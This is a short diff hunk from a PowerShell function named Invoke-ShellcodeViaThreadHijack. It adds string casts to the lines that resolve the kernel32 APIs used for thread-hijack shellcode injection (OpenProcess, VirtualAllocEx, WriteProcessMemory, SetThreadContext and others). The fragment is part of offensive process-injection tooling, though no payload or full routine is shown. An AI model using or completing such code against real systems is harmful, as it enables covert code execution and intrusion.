@@ -154,14 +154,14 @@ function Invoke-ShellcodeViaThreadHijack
 
     $Kernel32Handle                     = $GetModuleHandle.Invoke($null, @([String] "kernel32.dll"))
 
-    $OpenProcessAddress                 = $GetProcAddress.Invoke($null, @($Kernel32Handle, "OpenProcess"))
-    $OpenThreadAddress                  = $GetProcAddress.Invoke($null, @($Kernel32Handle, "OpenThread"))
-    $SuspendThreadAddress               = $GetProcAddress.Invoke($null, @($Kernel32Handle, "SuspendThread"))
-    $VirtualAllocExAddress              = $GetProcAddress.Invoke($null, @($Kernel32Handle, "VirtualAllocEx"))
-    $WriteProcessMemoryAddress          = $GetProcAddress.Invoke($null, @($Kernel32Handle, "WriteProcessMemory"))
-    $GetThreadContextAddress            = $GetProcAddress.Invoke($null, @($Kernel32Handle, "GetThreadContext"))
-    $SetThreadContextAddress            = $GetProcAddress.Invoke($null, @($Kernel32Handle, "SetThreadContext"))
-    $ResumeThreadAddress                = $GetProcAddress.Invoke($null, @($Kernel32Handle, "ResumeThread"))
+    $OpenProcessAddress                 = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "OpenProcess"))
+    $OpenThreadAddress                  = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "OpenThread"))
+    $SuspendThreadAddress               = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "SuspendThread"))
+    $VirtualAllocExAddress              = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "VirtualAllocEx"))
+    $WriteProcessMemoryAddress          = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "WriteProcessMemory"))
+    $GetThreadContextAddress            = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "GetThreadContext"))
+    $SetThreadContextAddress            = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "SetThreadContext"))
+    $ResumeThreadAddress                = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "ResumeThread"))
 
     # Create delegates with our function pointers.
 
